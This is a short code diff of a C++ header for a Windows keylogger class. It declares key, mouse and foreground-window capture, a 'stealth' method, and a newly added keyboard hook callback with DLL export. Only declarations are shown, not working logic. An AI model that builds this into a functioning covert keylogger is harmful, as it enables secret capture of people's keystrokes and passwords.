@@ -15,22 +15,32 @@
 #include <fstream>
 #include <Windows.h>
 
-class Keylog
+class __declspec(dllexport) Keylog
 {
 public:
 	Keylog();
 	~Keylog();
-	int		getKey(const INPUT_RECORD);
+	int		getKey();
 	int		getMouse();
 	int		getForeground();
 	int		stealth();
+
+	bool __stdcall installhook();
+	static LRESULT __stdcall  CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 private:
 	HWND	fg;
 	int		mousePosX;
 	int		mousePosY;
 	int		keyPressed;
-	FILE	*myKeylogfile;
+
+
+	// CALLBACK
+	//static HHOOK	hkb;
+	HINSTANCE		hins;
+	HHOOK hkb;
 };
+
+
 
 #endif /* !KEYLLOG_HH_ */
